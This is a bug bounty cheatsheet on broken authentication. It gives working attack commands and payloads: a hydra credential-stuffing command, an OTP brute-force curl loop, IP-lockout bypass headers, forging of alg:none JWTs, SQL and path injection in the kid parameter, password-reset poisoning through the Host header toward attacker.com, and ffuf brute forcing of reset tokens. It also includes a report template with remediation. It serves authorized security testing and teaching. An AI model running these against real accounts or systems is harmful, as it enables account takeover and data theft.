# Broken Authentication — Complete Bug Bounty Cheatsheet

> **OWASP:** A07:2025 — Authentication Failures  
> **Severity:** Critical — leads to Account Takeover (ATO)  
> **Impact:** Full account compromise, privilege escalation, data breach

---

## What is Broken Authentication?

Authentication failures occur when an application **incorrectly implements identity verification**, allowing attackers to compromise passwords, keys, session tokens, or exploit other flaws to assume another user's identity temporarily or permanently.

**81% of data breaches** involve stolen or weak credentials. This is consistently one of the highest-paid bug classes in bug bounty.

---

## 6 Attack Vectors

### 1. Credential Stuffing
Using leaked username:password combos from previous breaches.

```bash
# Tools
hydra -L userlist.txt -P passlist.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# Burp Suite Intruder → Pitchfork attack
# Load breached credential list from HaveIBeenPwned dumps

# What to look for
- No rate limiting on login endpoint
- No CAPTCHA after failed attempts
- No IP-based lockout
```

**Report if:** 50+ attempts succeed without any block.

---

### 2. Brute Force Attack
Systematically trying passwords until one works.

```bash
# OTP Brute Force (4-digit = 10,000 combos)
for i in $(seq -w 0000 9999); do
  curl -s -X POST https://target.com/verify-otp \
    -d "otp=$i" | grep -i "success\|invalid"
done

# Burp Intruder on OTP endpoint
# Payload: Numbers 0000-9999
# Check: Response length/status difference

# Header bypass tricks (if IP locked)
X-Forwarded-For: 127.0.0.1
X-Real-IP: 1.2.3.4
X-Originating-IP: 10.0.0.1
```

**Report if:** OTP/PIN endpoint has no lockout or rate limiting.

---

### 3. Weak Password Policy
Apps accepting passwords like `123456`, `password`, `abc`.

```
Test passwords to try during registration:
- 123456
- password
- 123
- a
- [blank]
- 12345678

Check:
- Minimum length < 8?
- No uppercase requirement?
- No special character required?
- Allows dictionary words?
```

**Report if:** Any of these are accepted on account creation.

---

### 4. Session Fixation
Attacker sets session ID before login — session doesn't regenerate after auth.

```
Steps to test:
1. Visit login page — grab session cookie value
2. Login with valid credentials
3. Check if session cookie value CHANGED after login

# If same value before & after login = Session Fixation!

Curl test:
curl -c cookies.txt https://target.com/login
# Note session ID
# Login with credentials
# Check if session ID changed in cookies.txt
```

**Report if:** Session token does not change upon successful authentication.

---

### 5. JWT Vulnerabilities
JSON Web Token implementation flaws.

```python
import jwt
import base64
import json

# 1. Decode token (no verification)
token = "eyJ..."
header, payload, sig = token.split(".")
decoded = base64.b64decode(payload + "==")
print(json.loads(decoded))

# 2. Algorithm None Attack
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "administrator"}
forged = base64.b64encode(json.dumps(header).encode()).decode().rstrip("=")
forged += "." + base64.b64encode(json.dumps(payload).encode()).decode().rstrip("=")
forged += "."  # empty signature
# Send this token — if server accepts = vulnerability!

# 3. Weak Secret Brute Force
hashcat -a 0 -m 16500 token.txt wordlist.txt

# 4. kid Parameter Injection
{"kid": "../../../../dev/null"}  # null byte injection
{"kid": "' UNION SELECT 'attacker_secret'--"}  # SQLi in kid
```

**Tools:** [jwt.io](https://jwt.io), jwt_tool, hashcat

---

### 6. Password Reset Flaws
Common vulnerabilities in forgot password flows.

```
Tests to perform:

1. Token Length — is reset token < 16 chars? Brute forceable!
   /reset?token=123456  →  only 1M combos

2. Token Expiry — request token, wait 48hrs, still works?
   Old tokens not invalidated = vulnerability

3. Host Header Injection
   POST /forgot-password
   Host: attacker.com        ← injected
   email=victim@target.com
   # If reset email sent to attacker.com domain = ATO!

4. Response Difference — does response differ for valid/invalid email?
   "Email sent!" vs "Email not found" = user enumeration

5. Multiple tokens — request reset twice, does first token still work?
```

---

## Quick Detection Checklist

```
☐ Login: 50 wrong attempts → still no lockout?
☐ OTP/2FA: Brute force 4-6 digit codes → no limit?
☐ Session: Token same before and after login?
☐ JWT: Try alg:none → accepted?
☐ JWT: Try weak secret (hashcat rockyou.txt)
☐ Password reset: Token short/predictable?
☐ Password reset: Host header injection?
☐ Password: Accepts "123" or blank password?
☐ Remember me: Cookie guessable/decodable?
☐ Logout: Session still valid after logout?
```

---

## Exploitation — Account Takeover Flow

```
Target: Password reset via email

1. Request reset for victim@target.com
2. Capture HTTP request in Burp
3. Modify Host header → attacker.com
4. If reset link arrives at attacker-controlled server:
   → CRITICAL Account Takeover via Host Header Injection

OR

1. Request reset for victim@target.com
2. Check reset token: /reset?token=Ab3kP  (5 chars)
3. Brute force: ffuf -w tokens.txt -u "https://target.com/reset?token=FUZZ"
4. Token matched → set new password → ATO
```

---

## Bug Bounty Report Template

```
Title: Account Takeover via Password Reset Token Brute Force

Severity: Critical (CVSS 9.8)

Endpoint: GET /reset-password?token=XXXX

Issue:
Password reset tokens are 5 characters long (alphanumeric),
resulting in only 60,466,176 possible combinations.
With no rate limiting, an attacker can brute force valid tokens.

Steps to Reproduce:
1. Request password reset for victim@target.com
2. Observe reset link: https://target.com/reset?token=Ab3kP
3. Run: ffuf -w tokens.txt -u "https://target.com/reset?token=FUZZ" -mc 200
4. Valid token found → set new password → account compromised

Impact:
Complete account takeover of any user on the platform.
Attacker gains full access to private data, payment info,
and can perform actions as the victim.

Remediation:
- Use cryptographically secure random tokens (min 32 chars)
- Implement rate limiting (5 attempts per token per hour)
- Set token expiry to 15 minutes maximum
- Invalidate token after single use
```

---

## Tools

| Tool | Use Case |
|------|----------|
| Burp Suite Intruder | Brute force login, OTP, reset tokens |
| Hydra | Credential stuffing automation |
| jwt_tool | JWT vulnerability testing |
| hashcat | Crack JWT weak secrets |
| ffuf | Token brute forcing |
| [jwt.io](https://jwt.io) | Decode & analyze JWT tokens |

---

## Practice Labs

- [PortSwigger Auth Labs](https://portswigger.net/web-security/authentication) — 14 free labs
- [PentesterLab JWT](https://pentesterlab.com) — JWT attack exercises
- [HackTheBox](https://hackthebox.com) — ATO challenges

---

## Key Takeaway

> Authentication bugs are the **highest-value bugs** in bug bounty.  
> A single account takeover on a critical endpoint = **$5,000–$30,000+**.  
> Always test every auth flow: login, OTP, reset, session, JWT.  
> **81% of breaches start here** — so should your testing.

---

*Daily Bug Bounty notes, cheatsheets & payloads — follow along.*
